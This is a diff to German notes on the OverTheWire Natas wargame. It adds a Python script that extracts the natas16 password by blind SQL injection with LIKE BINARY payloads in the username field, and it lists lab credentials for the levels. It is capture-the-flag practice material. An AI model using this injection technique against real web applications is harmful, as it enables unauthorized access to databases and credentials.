@@ -244,3 +244,56 @@ Im Get kann debug aktiviert werden, z.B. über OWASP ZAP.
 Zugriff:	[http://natas15.natas.labs.overthewire.org](http://natas15.natas.labs.overthewire.org)
 Username: `natas15`
 Passwort: `AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J  `
+
+User `natas16` existiert. Passwort über SQL-Injection mit Like:
+
+```Python
+import string
+import requests
+
+hasFound = False
+list = string.ascii_letters + "0123456789"
+found = ""
+toTry = ""
+passwordChars = []
+
+print("Collecting Password Information ...")
+
+for i in list:
+    data = {'username': 'natas16" and password like BINARY "%' + i + '%'}
+    r = requests.post('http://natas15.natas.labs.overthewire.org/index.php',
+                      auth=('natas15', 'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J'),
+                      data=data)
+
+    if 'This user exists.' in r.text:
+        passwordChars.append(i)
+
+
+print("Password Contains: ", passwordChars)
+
+print("Attacking Natas Server... ")
+
+while not hasFound:
+    for i in passwordChars:
+        toTry = i
+
+        data = {'username': 'natas16" and password like BINARY "' + found + toTry + '%'}
+        r = requests.post('http://natas15.natas.labs.overthewire.org/index.php',
+                          auth=('natas15', 'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J'),
+                          data=data)
+
+        if 'This user exists.' in r.text:
+            found += i
+            print("found: " + found)
+            if len(found) >= 32:
+                hasFound = True
+                print("Password for Natas 16 is: "+found)
+            break
+
+```
+
+# Natas 16
+
+Zugriff:	[http://natas16.natas.labs.overthewire.org](http://natas16.natas.labs.overthewire.org)
+Username: `natas16`
+Passwort: `WaIHEacj63wnNIBROHeqi3p9t0m5nhmh  `
